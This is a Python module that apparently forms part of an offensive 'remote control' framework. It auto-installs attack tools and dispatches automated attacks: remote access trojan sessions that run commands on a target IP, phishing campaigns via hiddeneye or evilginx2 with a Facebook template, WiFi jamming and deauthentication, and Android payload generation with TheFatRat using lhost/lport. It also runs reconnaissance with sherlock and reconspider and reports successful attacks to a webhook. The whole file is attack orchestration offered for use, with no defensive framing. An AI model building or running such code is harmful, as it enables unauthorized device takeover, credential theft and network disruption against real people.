"""
Enhanced Tool Integration System
Integrates external tools with the main remote control system
"""

import asyncio
import json
import logging
import os
import time
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import aiohttp
import websockets

# Import our tool management systems
from tool_manager import AdvancedToolManager
from tool_plugins import PluginManager, PluginResult

@dataclass
class IntegrationConfig:
    """Integration configuration"""
    auto_install_tools: bool = True
    auto_update_tools: bool = True
    enable_plugins: bool = True
    max_concurrent_tools: int = 5
    tool_timeout: int = 300
    enable_webhooks: bool = True
    webhook_url: str = ""

class EnhancedToolIntegration:
    """Enhanced tool integration system"""
    
    def __init__(self, config: IntegrationConfig = None):
        self.logger = logging.getLogger(__name__)
        self.config = config or IntegrationConfig()
        
        # Initialize tool managers
        self.tool_manager = AdvancedToolManager()
        self.plugin_manager = PluginManager()
        
        # Integration state
        self.active_integrations: Dict[str, Dict] = {}
        self.integration_results: List[Dict] = []
        self.webhook_sessions: Dict[str, Any] = {}
        
        # Performance tracking
        self.performance_metrics = {
            "total_executions": 0,
            "successful_executions": 0,
            "failed_executions": 0,
            "average_execution_time": 0.0,
            "total_execution_time": 0.0
        }
    
    async def initialize_integration(self) -> bool:
        """Initialize the integration system"""
        try:
            self.logger.info("Initializing enhanced tool integration system")
            
            # Initialize tool manager
            await self._initialize_tool_manager()
            
            # Initialize plugin manager
            await self._initialize_plugin_manager()
            
            # Setup webhooks if enabled
            if self.config.enable_webhooks:
                await self._setup_webhooks()
            
            self.logger.info("Enhanced tool integration system initialized successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to initialize integration system: {str(e)}")
            return False
    
    async def _initialize_tool_manager(self):
        """Initialize tool manager"""
        try:
            # Install essential tools if auto-install is enabled
            if self.config.auto_install_tools:
                essential_tools = ["stitch", "pyshell", "hiddeneye", "wifijammer"]
                
                for tool in essential_tools:
                    result = await self.tool_manager.install_tool(tool)
                    if result["success"]:
                        self.logger.info(f"Installed essential tool: {tool}")
                    else:
                        self.logger.warning(f"Failed to install tool {tool}: {result.get('error', 'Unknown error')}")
            
            # Update tools if auto-update is enabled
            if self.config.auto_update_tools:
                installed_tools = self.tool_manager.get_installed_tools()
                for tool in installed_tools:
                    if tool["is_installed"]:
                        await self.tool_manager.update_tool(tool["name"])
            
        except Exception as e:
            self.logger.error(f"Error initializing tool manager: {str(e)}")
    
    async def _initialize_plugin_manager(self):
        """Initialize plugin manager"""
        try:
            if self.config.enable_plugins:
                # Initialize all available plugins
                available_plugins = self.plugin_manager.get_available_plugins()
                
                for plugin in available_plugins:
                    await self.plugin_manager.initialize_plugin(plugin["name"])
                
                self.logger.info(f"Initialized {len(available_plugins)} plugins")
            
        except Exception as e:
            self.logger.error(f"Error initializing plugin manager: {str(e)}")
    
    async def _setup_webhooks(self):
        """Setup webhook system"""
        try:
            if self.config.webhook_url:
                # Test webhook connection
                async with aiohttp.ClientSession() as session:
                    async with session.post(self.config.webhook_url, json={"test": True}) as response:
                        if response.status == 200:
                            self.logger.info("Webhook system initialized successfully")
                        else:
                            self.logger.warning(f"Webhook test failed with status {response.status}")
            
        except Exception as e:
            self.logger.error(f"Error setting up webhooks: {str(e)}")
    
    async def execute_advanced_attack(self, attack_config: Dict) -> Dict:
        """Execute advanced attack using integrated tools"""
        start_time = time.time()
        
        try:
            attack_type = attack_config.get("type")
            target = attack_config.get("target")
            parameters = attack_config.get("parameters", {})
            
            self.logger.info(f"Executing advanced attack: {attack_type} on {target}")
            
            # Execute based on attack type
            if attack_type == "rat_attack":
                result = await self._execute_rat_attack(target, parameters)
            elif attack_type == "phishing_attack":
                result = await self._execute_phishing_attack(target, parameters)
            elif attack_type == "wifi_attack":
                result = await self._execute_wifi_attack(target, parameters)
            elif attack_type == "payload_attack":
                result = await self._execute_payload_attack(target, parameters)
            elif attack_type == "reconnaissance":
                result = await self._execute_reconnaissance(target, parameters)
            else:
                result = {
                    "success": False,
                    "error": f"Unknown attack type: {attack_type}"
                }
            
            # Update performance metrics
            execution_time = time.time() - start_time
            self._update_performance_metrics(result["success"], execution_time)
            
            # Send webhook notification
            if self.config.enable_webhooks and result["success"]:
                await self._send_webhook_notification(attack_type, target, result)
            
            return result
            
        except Exception as e:
            self.logger.error(f"Error executing advanced attack: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_rat_attack(self, target: str, parameters: Dict) -> Dict:
        """Execute RAT attack"""
        try:
            # Choose best RAT tool based on target
            rat_tool = self._select_best_rat_tool(target, parameters)
            
            # Execute using plugin
            plugin_result = await self.plugin_manager.execute_plugin(rat_tool, {
                "action": "connect",
                "target_ip": target,
                "target_port": parameters.get("port", 5555)
            })
            
            if plugin_result.success:
                # Execute additional commands if specified
                commands = parameters.get("commands", [])
                for command in commands:
                    await self.plugin_manager.execute_plugin(rat_tool, {
                        "action": "execute_command",
                        "target_ip": target,
                        "command": command
                    })
                
                return {
                    "success": True,
                    "tool_used": rat_tool,
                    "target": target,
                    "commands_executed": len(commands),
                    "data": plugin_result.data
                }
            else:
                return {
                    "success": False,
                    "error": plugin_result.error,
                    "tool_used": rat_tool
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_phishing_attack(self, target: str, parameters: Dict) -> Dict:
        """Execute phishing attack"""
        try:
            # Choose best phishing tool
            phishing_tool = self._select_best_phishing_tool(target, parameters)
            
            # Create and start campaign
            campaign_result = await self.plugin_manager.execute_plugin(phishing_tool, {
                "action": "create_campaign",
                "template": parameters.get("template", "facebook"),
                "target_url": target
            })
            
            if campaign_result.success:
                # Start the campaign
                start_result = await self.plugin_manager.execute_plugin(phishing_tool, {
                    "action": "start_campaign",
                    "campaign_id": campaign_result.data.get("campaign_id")
                })
                
                return {
                    "success": True,
                    "tool_used": phishing_tool,
                    "target": target,
                    "campaign_id": campaign_result.data.get("campaign_id"),
                    "data": start_result.data
                }
            else:
                return {
                    "success": False,
                    "error": campaign_result.error,
                    "tool_used": phishing_tool
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_wifi_attack(self, target: str, parameters: Dict) -> Dict:
        """Execute WiFi attack"""
        try:
            # Choose best WiFi attack tool
            wifi_tool = self._select_best_wifi_tool(target, parameters)
            
            # Scan for networks first
            scan_result = await self.plugin_manager.execute_plugin(wifi_tool, {
                "action": "scan_networks",
                "interface": parameters.get("interface", "wlan0")
            })
            
            if scan_result.success:
                # Jam specific network or perform deauth attack
                if parameters.get("attack_type") == "deauth":
                    attack_result = await self.plugin_manager.execute_plugin(wifi_tool, {
                        "action": "deauth_attack",
                        "target_mac": target,
                        "interface": parameters.get("interface", "wlan0")
                    })
                else:
                    attack_result = await self.plugin_manager.execute_plugin(wifi_tool, {
                        "action": "jam_network",
                        "target_ssid": target,
                        "interface": parameters.get("interface", "wlan0")
                    })
                
                return {
                    "success": True,
                    "tool_used": wifi_tool,
                    "target": target,
                    "networks_found": len(scan_result.data.get("networks", [])),
                    "attack_data": attack_result.data
                }
            else:
                return {
                    "success": False,
                    "error": scan_result.error,
                    "tool_used": wifi_tool
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_payload_attack(self, target: str, parameters: Dict) -> Dict:
        """Execute payload attack"""
        try:
            # Use TheFatRat for payload generation
            payload_type = parameters.get("payload_type", "android")
            lhost = parameters.get("lhost", "192.168.1.100")
            lport = parameters.get("lport", 4444)
            
            # Generate payload using tool manager
            result = await self.tool_manager.run_tool("thefatrat", {
                "payload_type": payload_type,
                "lhost": lhost,
                "lport": lport,
                "target": target
            })
            
            return {
                "success": result["success"],
                "tool_used": "thefatrat",
                "payload_type": payload_type,
                "target": target,
                "data": result
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_reconnaissance(self, target: str, parameters: Dict) -> Dict:
        """Execute reconnaissance"""
        try:
            # Use multiple reconnaissance tools
            tools = ["reconspider", "sherlock"]
            results = {}
            
            for tool in tools:
                if tool == "reconspider":
                    result = await self.tool_manager.run_tool(tool, {
                        "target": target,
                        "scan_type": "full"
                    })
                elif tool == "sherlock":
                    result = await self.tool_manager.run_tool(tool, {
                        "username": target
                    })
                
                results[tool] = result
            
            return {
                "success": True,
                "tools_used": tools,
                "target": target,
                "results": results
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    def _select_best_rat_tool(self, target: str, parameters: Dict) -> str:
        """Select best RAT tool for target"""
        # Simple selection logic - can be enhanced with ML
        if "android" in target.lower() or "mobile" in target.lower():
            return "pyshell"  # Better for mobile devices
        else:
            return "stitch"  # General purpose
    
    def _select_best_phishing_tool(self, target: str, parameters: Dict) -> str:
        """Select best phishing tool for target"""
        # Simple selection logic
        if "advanced" in parameters.get("complexity", "").lower():
            return "evilginx2"  # More advanced
        else:
            return "hiddeneye"  # General purpose
    
    def _select_best_wifi_tool(self, target: str, parameters: Dict) -> str:
        """Select best WiFi attack tool"""
        # Simple selection logic
        if "fluxion" in parameters.get("preference", "").lower():
            return "fluxion"
        else:
            return "wifijammer"  # Default choice
    
    def _update_performance_metrics(self, success: bool, execution_time: float):
        """Update performance metrics"""
        self.performance_metrics["total_executions"] += 1
        self.performance_metrics["total_execution_time"] += execution_time
        
        if success:
            self.performance_metrics["successful_executions"] += 1
        else:
            self.performance_metrics["failed_executions"] += 1
        
        # Calculate average execution time
        total_executions = self.performance_metrics["total_executions"]
        total_time = self.performance_metrics["total_execution_time"]
        
        if total_executions > 0:
            self.performance_metrics["average_execution_time"] = total_time / total_executions
    
    async def _send_webhook_notification(self, attack_type: str, target: str, result: Dict):
        """Send webhook notification"""
        try:
            if self.config.webhook_url:
                notification = {
                    "timestamp": datetime.now().isoformat(),
                    "attack_type": attack_type,
                    "target": target,
                    "success": result["success"],
                    "tool_used": result.get("tool_used", "unknown"),
                    "data": result.get("data", {})
                }
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(self.config.webhook_url, json=notification) as response:
                        if response.status != 200:
                            self.logger.warning(f"Webhook notification failed: {response.status}")
            
        except Exception as e:
            self.logger.error(f"Error sending webhook notification: {str(e)}")
    
    def get_integration_status(self) -> Dict:
        """Get integration system status"""
        tool_stats = self.tool_manager.get_tool_statistics()
        plugin_stats = self.plugin_manager.get_plugin_statistics()
        
        return {
            "tool_manager": tool_stats,
            "plugin_manager": plugin_stats,
            "performance_metrics": self.performance_metrics,
            "active_integrations": len(self.active_integrations),
            "total_results": len(self.integration_results)
        }
    
    def get_available_attacks(self) -> List[Dict]:
        """Get list of available attack types"""
        return [
            {
                "type": "rat_attack",
                "name": "Remote Access Trojan Attack",
                "description": "Establish remote control over target device",
                "tools": ["stitch", "pyshell"],
                "parameters": ["target_ip", "port", "commands"]
            },
            {
                "type": "phishing_attack",
                "name": "Phishing Campaign",
                "description": "Create and execute phishing campaigns",
                "tools": ["hiddeneye", "evilginx2"],
                "parameters": ["target_url", "template", "campaign_duration"]
            },
            {
                "type": "wifi_attack",
                "name": "WiFi Network Attack",
                "description": "Jam WiFi networks or perform deauth attacks",
                "tools": ["wifijammer", "fluxion"],
                "parameters": ["target_ssid", "interface", "attack_type"]
            },
            {
                "type": "payload_attack",
                "name": "Payload Generation Attack",
                "description": "Generate and deploy malicious payloads",
                "tools": ["thefatrat"],
                "parameters": ["payload_type", "lhost", "lport"]
            },
            {
                "type": "reconnaissance",
                "name": "Target Reconnaissance",
                "description": "Gather information about target",
                "tools": ["reconspider", "sherlock"],
                "parameters": ["target", "scan_type"]
            }
        ]
    
    async def cleanup_integration(self):
        """Cleanup integration resources"""
        try:
            # Stop all running tools
            for tool_name in list(self.tool_manager.tool_processes.keys()):
                await self.tool_manager.stop_tool(tool_name)
            
            # Cleanup plugins
            for plugin in self.plugin_manager.plugins.values():
                await plugin.cleanup()
            
            self.logger.info("Integration system cleanup completed")
            
        except Exception as e:
            self.logger.error(f"Error during cleanup: {str(e)}")